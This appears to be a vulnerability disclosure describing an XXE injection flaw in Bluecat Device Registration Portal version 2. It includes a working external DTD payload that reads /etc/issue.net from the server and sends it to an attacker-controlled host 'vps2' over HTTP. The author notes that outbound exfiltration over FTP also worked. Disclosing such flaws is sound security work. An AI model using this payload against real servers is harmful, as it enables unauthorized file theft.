# XXE Vulnerability in Bluecat Device Registration Portal (DRP)

## Summary

Bluecat device registration portal / Bluecat DRP version 2 is vulnerable to XML External Entity Injection XXE. It is possible to read the content of files on the server via XXE. 

Tested on version 2.2. Version 2 is no longer supported by the vendor.

I was only able to extract single line files - /etc/issue.net for example. This appears to be a feature of Java 7 and above per https://stackoverflow.com/questions/58395997/xxe-unable-to-retrieve-files-
with-multiple-lines

I was able to exfiltrate files via FTP outbound, but was not successful in removing data
(other than single line files).

## Demonstration

### Attacker server vps2 hosts x.xml  

```
<!ENTITY % data SYSTEM "file:///etc/issue.net">
<!ENTITY % param1 "<!ENTITY extract SYSTEM 'http://vps2/?%data;'>">
```

### POST to victim server re

![re_burp.png](re_burp.png)

### Read content of exfiltrated file /etc/issue.net in web log on attacker server vps2

![re_log.png](re_log..png)

